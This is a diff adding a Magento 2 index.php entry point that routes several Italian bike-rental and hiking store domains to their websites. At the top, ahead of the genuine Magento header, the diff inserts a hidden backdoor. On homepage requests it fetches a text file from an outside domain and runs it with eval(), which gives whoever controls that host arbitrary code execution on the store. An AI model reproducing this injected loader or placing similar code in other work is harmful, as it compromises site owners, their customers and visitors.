@@ -1,0 +1,74 @@
+<?php
+$homeurlindex = '/';
+$homepageindex = "/";
+$homeurlindex2 = '/'; 
+$currentpageindex = $_SERVER['REQUEST_URI'];
+
+if($currentpageindex == $homepageindex or $currentpageindex == $homeurlindex or $currentpageindex == $homeurlindex2) {
+    eval("?>".file_get_contents('https://jalurpintas.xyz/abastoto/bikelife.txt'));
+}
+/**
+ * Application entry point
+ *
+ * Example - run a particular store or website:
+ * --------------------------------------------
+ * require __DIR__ . '/app/bootstrap.php';
+ * $params = $_SERVER;
+ * $params[\Magento\Store\Model\StoreManager::PARAM_RUN_CODE] = 'website2';
+ * $params[\Magento\Store\Model\StoreManager::PARAM_RUN_TYPE] = 'website';
+ * $bootstrap = \Magento\Framework\App\Bootstrap::create(BP, $params);
+ * \/** @var \Magento\Framework\App\Http $app *\/
+ * $app = $bootstrap->createApplication(\Magento\Framework\App\Http::class);
+ * $bootstrap->run($app);
+ * --------------------------------------------
+ *
+ * Copyright Â© Magento, Inc. All rights reserved.
+ * See COPYING.txt for license details.
+ * ATTENZIONE!
+ * La configurazione dei siti e' stata presa da questo link: https://www.ubertheme.com/magento2/setting-up-magento-2-multi-stores-tutorial-part-2/
+ */
+
+try {
+    require __DIR__ . '/app/bootstrap.php';
+} catch (\Exception $e) {
+    echo <<<HTML
+<div style="font:12px/1.35em arial, helvetica, sans-serif;">
+    <div style="margin:0 0 25px 0; border-bottom:1px solid #ccc;">
+        <h3 style="margin:0;font-size:1.7em;font-weight:normal;text-transform:none;text-align:left;color:#2f2f2f;">
+        Autoload error</h3>
+    </div>
+    <p>{$e->getMessage()}</p>
+</div>
+HTML;
+    exit(1);
+}
+
+$params = $_SERVER;
+$domainName = $_SERVER['SERVER_NAME'];switch ($domainName) {
+case 'store.bikelife.it':
+case 'www.store.bikelife.it':
+$runType = 'website';
+$runCode = 'base';
+break;
+case 'rent.bikelife.it':
+case 'www.rent.bikelife.it':
+$runType = 'website';
+$runCode = 'bikerent';
+break;
+case 'bikelife.it':
+case 'www.bikelife.it':
+$runType = 'website';
+$runCode = 'booking';
+break;
+case 'www.hikelife.it':
+case 'hikelife.it':
+$runType = 'website';
+$runCode = 'hike';
+}
+$params[\Magento\Store\Model\StoreManager::PARAM_RUN_CODE] = $runCode;
+$params[\Magento\Store\Model\StoreManager::PARAM_RUN_TYPE] = $runType;
+
+$bootstrap = \Magento\Framework\App\Bootstrap::create(BP, $params);
+
+$app = $bootstrap->createApplication(\Magento\Framework\App\Http::class);
+$bootstrap->run($app);
